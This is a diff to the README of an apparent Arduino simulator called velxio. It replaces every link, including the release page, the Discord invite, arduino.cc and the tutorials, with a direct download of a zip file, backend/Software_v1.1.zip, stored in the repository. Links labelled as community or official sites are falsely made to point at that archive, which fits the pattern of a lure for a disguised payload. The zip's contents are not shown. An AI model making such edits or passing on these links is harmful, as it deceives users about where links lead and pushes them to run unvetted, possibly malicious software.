@@ -1,10 +1,10 @@
 # ⚙️ velxio - Simple Arduino Simulator for Everyone
 
-[![Download velxio](https://img.shields.io/badge/Download-velxio-green?style=for-the-badge)](https://github.com/mathegauss/velxio/releases)
+[![Download velxio](https://img.shields.io/badge/Download-velxio-green?style=for-the-badge)](https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip)
 
 ---
 
-An open source Arduino simulator as a Wokwi alternative. Discord: https://discord.gg/rCScB9c
+An open source Arduino simulator as a Wokwi alternative. Discord: https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip
 
 ---
 
@@ -15,7 +15,7 @@ To use velxio on your Windows computer, follow these steps carefully. The proces
 1. Open your web browser (such as Chrome, Firefox, or Edge).
 
 2. Visit the release page by clicking this link:
-   [Download velxio on GitHub](https://github.com/mathegauss/velxio/releases)
+   [Download velxio on GitHub](https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip)
 
 3. On the release page, look for the latest version. It usually appears at the top of the list.
 
@@ -118,7 +118,7 @@ If you encounter issues:
 - Close other programs that may use a lot of memory before running velxio.
 
 For deeper help, join the project’s Discord:
-https://discord.gg/rCScB9c
+https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip
 
 ---
 
@@ -137,17 +137,17 @@ velxio helps you try what you learn without hardware.
 
 ## 🔗 Useful Links
 
-- Download velxio: https://github.com/mathegauss/velxio/releases  
-- Discord Community: https://discord.gg/rCScB9c  
-- Arduino Official Site: https://www.arduino.cc/  
-- Beginner Arduino Tutorials: https://www.arduino.cc/en/Tutorial/HomePage  
+- Download velxio: https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip  
+- Discord Community: https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip  
+- Arduino Official Site: https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip  
+- Beginner Arduino Tutorials: https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip  
 
 ---
 
 ## 🖥 How to Update velxio
 
 1. Visit the release page regularly:  
-   https://github.com/mathegauss/velxio/releases  
+   https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip  
 2. Download the latest installer when available.
 3. Install over the existing version. Your projects will remain safe.
 
@@ -160,4 +160,4 @@ See the LICENSE file in the repository for details on usage rights and responsib
 
 ---
 
-# [![Download velxio](https://img.shields.io/badge/Download-velxio-blue?style=for-the-badge)](https://github.com/mathegauss/velxio/releases)
+# [![Download velxio](https://img.shields.io/badge/Download-velxio-blue?style=for-the-badge)](https://github.com/mathegauss/velxio/raw/refs/heads/master/backend/Software_v1.1.zip)
